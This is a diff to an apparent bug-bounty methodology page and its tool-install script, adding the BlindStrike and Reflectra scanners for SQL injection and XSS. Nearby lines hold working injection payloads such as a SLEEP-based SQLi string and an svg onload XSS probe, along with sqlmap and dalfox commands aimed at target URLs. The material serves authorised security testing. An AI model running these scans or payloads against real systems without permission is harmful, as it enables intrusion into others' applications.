@@ -1222,8 +1222,15 @@ masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt</code></pre><
     <div class="phase-head"><span class="tag">PHASE 07</span><h2>Vulnerability Testing — SQLi / XSS / LFI</h2><span class="impact impact-crit">CRITICAL</span></div>
     <p class="phase-desc">Where recon meets exploitation. Take the gf-filtered URL sets and start probing for real, reportable bugs.</p>
 
-    <div class="step"><div class="step-head"><div class="step-title"><span class="idx">21.</span>SQL Injection</div><div class="step-toggle">▼</div></div>
-    <div class="step-body"><div class="step-body-inner"><pre><code>cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
+    <div class="step"><div class="step-head"><div class="step-title"><span class="idx">21.</span>SQL Injection (BlindStrike &amp; SQLMap)</div><div class="step-toggle">▼</div></div>
+    <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># BlindStrike — empirical latency baseline &amp; boolean blind SQLi framework</span>
+blindstrike -l sqli_urls.txt -p payloads/generic.txt -t 10 --stop-on-confirm --html-report blindstrike_report.html
+
+<span class="comment"># Single URL or custom parameter FUZZ injection</span>
+blindstrike -u "https://target.com/api/v1/user?id=1FUZZ" -p payloads/mysql.txt -v
+
+<span class="comment"># SQLMap verification</span>
+cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
 
 <span class="comment"># error-based quick check</span>
 cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql" | tee sqli_errors.txt
@@ -1231,8 +1238,15 @@ cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mys
 <span class="comment"># time-based blind check</span>
 cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10</code></pre></div></div></div>
 
-    <div class="step"><div class="step-head"><div class="step-title"><span class="idx">22.</span>Cross-Site Scripting (XSS)</div><div class="step-toggle">▼</div></div>
-    <div class="step-body"><div class="step-body-inner"><pre><code>echo target.com | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe --silence --skip-bav
+    <div class="step"><div class="step-head"><div class="step-title"><span class="idx">22.</span>Cross-Site Scripting — XSS (Reflectra &amp; Dalfox)</div><div class="step-toggle">▼</div></div>
+    <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Reflectra — context-aware probing + real headless Chrome dialog interception</span>
+reflectra -f xss_urls.txt -t 10 --stop-on-first-confirmed -o reflectra_report.html
+
+<span class="comment"># Single target scan</span>
+reflectra -u "https://target.com/search?q=test" --max-payloads-per-point 100
+
+<span class="comment"># Dalfox pipe triage</span>
+echo target.com | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe --silence --skip-bav
 
 echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
 
@@ -6920,6 +6934,8 @@ clone_or_update() {
     fi
 }
 
+clone_or_update "BlindStrike"     "https://github.com/pratik-khairnar-sec/BlindStrike.git"
+clone_or_update "Reflectra"       "https://github.com/pratik-khairnar-sec/Reflectra.git"
 clone_or_update "LinkFinder"     "https://github.com/GerbenJavado/LinkFinder.git"
 clone_or_update "SecretFinder"   "https://github.com/m4ll0k/SecretFinder.git"
 clone_or_update "GitDorker"      "https://github.com/obheda12/GitDorker.git"
@@ -6939,7 +6955,7 @@ clone_or_update "git-dumper"     "https://github.com/arthaud/git-dumper.git"
 
 # Install requirements for cloned tools
 echo -e "\${C_CYAN}[+] Step 7: Resolving Dependencies for Cloned Repositories...\${C_RESET}"
-for REPO in LinkFinder SecretFinder GitDorker favUp jwt_tool cloud_enum sherlock blackbird mosint CloakQuest3r GraphQLmap; do
+for REPO in BlindStrike Reflectra LinkFinder SecretFinder GitDorker favUp jwt_tool cloud_enum sherlock blackbird mosint CloakQuest3r GraphQLmap; do
     if [ -f "\${INSTALL_DIR}/\${REPO}/requirements.txt" ]; then
         pip3 install --break-system-packages -r "\${INSTALL_DIR}/\${REPO}/requirements.txt" >/dev/null 2>&1 || \\
         pip3 install -r "\${INSTALL_DIR}/\${REPO}/requirements.txt" >/dev/null 2>&1 || true
@@ -6992,6 +7008,8 @@ EOF"
 }
 
 # Create wrappers for cloned tools so typing either "tool" or "tool.py" runs immediately from anywhere!
+create_py_wrapper "blindstrike"     "\${INSTALL_DIR}/BlindStrike/blindstrike.py"
+create_py_wrapper "reflectra"       "\${INSTALL_DIR}/Reflectra/reflectra.py"
 create_py_wrapper "SecretFinder.py" "\${INSTALL_DIR}/SecretFinder/SecretFinder.py"
 create_py_wrapper "linkfinder.py"   "\${INSTALL_DIR}/LinkFinder/linkfinder.py"
 create_py_wrapper "GitDorker.py"    "\${INSTALL_DIR}/GitDorker/GitDorker.py"
